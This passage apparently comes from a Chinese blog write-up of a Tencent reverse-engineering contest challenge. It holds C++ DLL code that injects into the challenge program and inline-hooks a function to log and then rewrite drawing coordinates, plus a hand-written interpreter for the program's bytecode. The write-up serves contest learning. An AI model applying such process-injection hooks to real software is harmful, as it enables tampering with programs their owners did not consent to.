HookCode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,  <span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>                                           <span class="comment">//jmp rax </span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE OriginCode[<span class="number">0x50</span>];</span><br><span class="line"><span class="type">size_t</span> HookLen = <span class="number">12</span>;</span><br><span class="line">__int64 times = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> k : s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(%d,%d)\n&quot;</span>, k.first, k.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">HackShellcode</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, OriginCode,HookLen);              <span class="comment">//unhook</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> x = a1, y = a2;</span><br><span class="line">    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);</span><br><span class="line">    times--;</span><br><span class="line">    <span class="keyword">if</span> (times&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call shellcode(%d,%d,%d,%d,%x,%p,%p,%p,%p,%p)\n&quot;</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> presize = s.<span class="built_in">size</span>();</span><br><span class="line">    s.<span class="built_in">insert</span>(&#123; x,y &#125;);</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">size</span>() == presize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="built_in">printset</span>();</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//rehook</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __int64 base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    __int64 Ptr = base + <span class="number">0x8308</span>;</span><br><span class="line">    </span><br><span class="line">    shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">    <span class="keyword">while</span> (!shellcode) &#123;</span><br><span class="line">        shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find shellcode Fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode addr=%p\n&quot;</span>, shellcode);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginCode, shellcode,HookLen);              <span class="comment">//saved</span></span><br><span class="line">    Func FuncPtr = HackShellcode;</span><br><span class="line">    *(__int64*)(HookCode + <span class="number">2</span>) = (__int64)FuncPtr;       <span class="comment">//construct</span></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//hook</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">AllocConsole</span>();</span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">        <span class="built_in">HookShellcode</span>();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">(-950,-210)</span><br><span class="line">(-950,50)</span><br><span class="line">(-950,170)</span><br><span class="line">(-890,-270)</span><br><span class="line">(-830,170)</span><br><span class="line">(-770,230)</span><br><span class="line">(50,-390)</span><br><span class="line">(50,230)</span><br><span class="line">(50,350)</span><br><span class="line">(110,-390)</span><br><span class="line">(170,-270)</span><br><span class="line">(410,290)</span><br><span class="line">(470,230)</span><br><span class="line">(470,290)</span><br><span class="line">(530,170)</span><br><span class="line">(530,290)</span><br><span class="line">(590,110)</span><br><span class="line">(650,50)</span><br><span class="line">(710,50)</span><br><span class="line">(710,110)</span><br><span class="line">(770,50)</span><br><span class="line">(770,170)</span><br><span class="line">(830,50)</span><br><span class="line">(830,230)</span><br><span class="line">(890,290)</span><br><span class="line">(950,50)</span><br><span class="line">(950,290)</span><br><span class="line">(1010,50)</span><br><span class="line">(1010,110)</span><br><span class="line">(1010,290)</span><br><span class="line">(1070,50)</span><br><span class="line">(1070,170)</span><br><span class="line">(1070,290)</span><br><span class="line">(1130,50)</span><br><span class="line">(1130,170)</span><br><span class="line">(1130,230)</span><br><span class="line">(1190,170)</span><br><span class="line">(1190,290)</span><br><span class="line">(1250,170)</span><br><span class="line">(1250,290)</span><br><span class="line">(1310,290)</span><br><span class="line">(1370,290)</span><br></pre></td></tr></table></figure><p>一共是 42 个点，而数了一下它题目给的正确的点数刚好也是42个，黄点是有 11 个， 蓝点有 31 个。</p><p>但是稍微改了一下第一个第二个参数发现点会直接消失，看样子是跟第三个第四个参数会有关系。</p><img src="/2024/03/19/tencent-race-2022-pre/14.png" class=""><p>通过左右参数的比对观察一下，正确调用时的这些局部变量分别是多少，看看能不能找到点关系（放弃）。</p><p>还是选择自己写一个虚拟机去跑。</p><p>代码太长了不放了，可以自己去 dump，我写一下我自己的虚拟机调试流程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> code[<span class="number">1855</span>];<span class="comment">//...</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> RIP=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> reg;</span><br><span class="line">    <span class="type">int</span> Stack[<span class="number">50</span>];</span><br><span class="line">    <span class="type">int</span> v13,v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(Stack,<span class="number">0</span>,<span class="built_in">sizeof</span>(Stack));</span><br><span class="line">    Stack[<span class="number">8</span>]=Stack[<span class="number">9</span>]=<span class="number">50</span>;<span class="comment">//截图中忘了这一句，不要忘了加上</span></span><br><span class="line">    <span class="keyword">while</span>(RIP&lt;=<span class="number">0x1301</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;execute opcode=%d RIP=%d\n&quot;,code[RIP],RIP);</span></span><br><span class="line">        <span class="type">int</span> opcode=code[RIP];</span><br><span class="line">        RIP++;</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                Stack[<span class="number">0</span>]+=Stack[<span class="number">1</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;stack[0]=%d+%d\n&quot;</span>,Stack[<span class="number">0</span>],Stack[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Stack[<span class="number">0</span>]-=Stack[<span class="number">1</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;stack[0]=%d-%d\n&quot;</span>,Stack[<span class="number">0</span>],Stack[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                Stack[code[RIP<span class="number">+1</span>]]=Stack[code[RIP]];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Stack[%d]=Stack[%d]=%d\n&quot;</span>,code[RIP<span class="number">+1</span>],code[RIP],Stack[code[RIP]]);</span><br><span class="line">                RIP+=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                Stack[code[RIP<span class="number">+1</span>]]=code[RIP];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Stack[%d]=%d\n&quot;</span>,code[RIP<span class="number">+1</span>],code[RIP]);</span><br><span class="line">                RIP+=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                v13=Stack[<span class="number">0</span>];</span><br><span class="line">                v14=Stack[<span class="number">0</span>]*(Stack[<span class="number">1</span>]<span class="number">+1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Origin: Stack[0]=%d Stack[1]=%d &quot;</span>,Stack[<span class="number">0</span>],Stack[<span class="number">1</span>]);</span><br><span class="line">                Stack[<span class="number">0</span>]=code[RIP]^<span class="number">0x414345</span>;</span><br><span class="line">                Stack[<span class="number">1</span>]=((Stack[<span class="number">0</span>] ^ (Stack[<span class="number">1</span>] + v13)) % <span class="number">256</span>+ (((Stack[<span class="number">0</span>] ^ (v13 * Stack[<span class="number">1</span>])) % <span class="number">256</span> + (((Stack[<span class="number">0</span>] ^ (Stack[<span class="number">1</span>] + v14)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Target: Stack[0]=%d Stack[1]=%d\n&quot;</span>,Stack[<span class="number">0</span>],Stack[<span class="number">1</span>]);</span><br><span class="line">                RIP+=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;paint(%d,%d,%d,%d,0xFFFFFF00);\n&quot;</span>,Stack[<span class="number">4</span>],Stack[<span class="number">5</span>],Stack[<span class="number">6</span>],Stack[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;paint(%d,%d,%d,%d,0xFF2DDBE7);\n&quot;</span>,Stack[<span class="number">4</span>],Stack[<span class="number">5</span>],Stack[<span class="number">6</span>],Stack[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后发现了一点：</p><img src="/2024/03/19/tencent-race-2022-pre/15.png" class=""><p>第三个和第四个参数分别为用 <code>opcode==4</code> 时候的 x 和 y 的坐标运算得到的值。</p><p>试试看利用 opcode&#x3D;4 的流程能否让程序任意位置输出色块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v13=x;</span><br><span class="line">v14=x*(y+<span class="number">1</span>);</span><br><span class="line">a3=operand^<span class="number">0x414345</span>;</span><br><span class="line">a4=((x ^ (y + v13)) % <span class="number">256</span>+ (((x ^ (v13 * y)) % <span class="number">256</span> + (((x ^ (y + v14)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>));</span><br></pre></td></tr></table></figure><p>因为每次的这个操作数都不同，这里选取第一个错误坐标 <code>-950 50</code> 来绘制，利用这里的逻辑去做。</p><p>DLL代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line">std::set&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (*Func)(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);</span><br><span class="line"><span class="function">__int64 <span class="title">GetBaseAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hMode = <span class="built_in">GetModuleHandle</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> (__int64)hMode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* shellcode = <span class="number">0</span>;</span><br><span class="line">BYTE HookCode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,  <span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>                                           <span class="comment">//jmp rax </span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE OriginCode[<span class="number">0x50</span>];</span><br><span class="line"><span class="type">size_t</span> HookLen = <span class="number">12</span>;</span><br><span class="line">__int64 times = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> k : s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(%d,%d)\n&quot;</span>, k.first, k.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">HackShellcode</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, OriginCode,HookLen);              <span class="comment">//unhook</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> x = a1, y = a2;</span><br><span class="line">    <span class="type">int</span> v13, v14;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">-950</span> &amp;&amp; y == <span class="number">50</span>) &#123;</span><br><span class="line">        x = <span class="number">50</span>;</span><br><span class="line">        y = <span class="number">50</span>;</span><br><span class="line">        v13=x;</span><br><span class="line">v14=x*(y<span class="number">+1</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;Origin: Stack[0]=%d Stack[1]=%d &quot;,Stack[0],Stack[1]);</span></span><br><span class="line">        <span class="comment">//printf(&quot;num=0x%x &quot;,code[RIP]);</span></span><br><span class="line">a3=<span class="number">0x524895</span>^<span class="number">0x414345</span>;</span><br><span class="line">a4=(<span class="type">unsigned</span> <span class="type">int</span>)((a3 ^ (y + v13)) % <span class="number">256</span></span><br><span class="line">                        + (((a3 ^ (v13 * y)) % <span class="number">256</span> + (((a3 ^ (y + v14)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);</span><br><span class="line">    times--;</span><br><span class="line">    <span class="keyword">if</span> (times&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call shellcode(%d,%d,%d,%d,%x) retval=%d\n&quot;</span>,x, y, a3, a4, a5, ret);          </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> presize = s.<span class="built_in">size</span>();</span><br><span class="line">    s.<span class="built_in">insert</span>(&#123; x,y &#125;);</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">size</span>() == presize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="built_in">printset</span>();</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//rehook</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __int64 base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    __int64 Ptr = base + <span class="number">0x8308</span>;</span><br><span class="line">    </span><br><span class="line">    shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">    <span class="keyword">while</span> (!shellcode) &#123;</span><br><span class="line">        shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find shellcode Fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode addr=%p\n&quot;</span>, shellcode);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginCode, shellcode,HookLen);              <span class="comment">//saved</span></span><br><span class="line">    Func FuncPtr = HackShellcode;</span><br><span class="line">    *(__int64*)(HookCode + <span class="number">2</span>) = (__int64)FuncPtr;       <span class="comment">//construct</span></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//hook</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">AllocConsole</span>();</span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">        <span class="built_in">HookShellcode</span>();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入之后，在指定的位置输出了黄色方块</p><img src="/2024/03/19/tencent-race-2022-pre/16.png" class=""><p>说明修复思路是没有问题的，接下来可以用虚拟机流程把错误的坐标和对应的该操作数 dump 出来，hook 的时候进行替换。</p><p>后面用截图工具比了一下，发现它们水平距离都一样的，所以可以用已有的正确坐标参考，从上到下坐标分别为 <code>50,110,170,230...</code> 就是每隔一个查了 <code>60</code> 的距离，水平距离也同样是 60，那么最靠左的正确的方块是 <code>(410,290)</code>，肉眼分析下来，最左边的坐标是 50，y 坐标因为对对齐的也是 50，所以第一个色块是完美还原的。</p><p>那么最左边 6 个就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">50,50</span><br><span class="line">50,110</span><br><span class="line">50,170</span><br><span class="line">50,230</span><br><span class="line">50,290</span><br><span class="line">50,350</span><br></pre></td></tr></table></figure><p>对角线延伸出去三个就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">110,110</span><br><span class="line">170,170</span><br><span class="line">230,230</span><br></pre></td></tr></table></figure><p>最后两个补齐 FLAG是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">110,230</span><br><span class="line">170,230</span><br></pre></td></tr></table></figure><p>最后的DLL：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 